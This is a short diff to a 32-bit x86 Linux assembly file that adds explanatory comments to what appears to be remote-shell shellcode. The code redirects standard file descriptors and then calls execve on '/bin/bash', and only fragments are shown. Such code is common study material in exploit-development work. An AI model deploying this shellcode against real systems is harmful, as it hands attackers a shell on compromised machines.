@@ -15,7 +15,7 @@ _start:
 
   mov ecx, esp ; move stack pointer into ecx
 
-  int 0x80 ; interrupt 
+  int 0x80 ; interrupt
 
   mov edx,eax ; move file descriptor into edx for later
 
@@ -67,16 +67,14 @@ _start:
   mov ecx, 2; stderr
   int 0x80
 
-  push dword 0
-  push 0x68736162
+  push dword 0 ; padding/ zero termination for string
+  push 0x68736162 ; "////bin/bash" backwards
   push 0x2f6e6962
   push 0x2f2f2f2f
 
-  mov ebx, esp
-  mov edx, 0
+  mov ebx, esp ; mov the first arg, filename (path to bash) into ebx
+  mov edx, 0 ; envp = NULL
   mov ecx, 0 ; argv = NULL
 
-  mov eax, 11 ; syscall for execve
+  mov eax, 11 ; syscall # for execve
   int 0x80
-
-
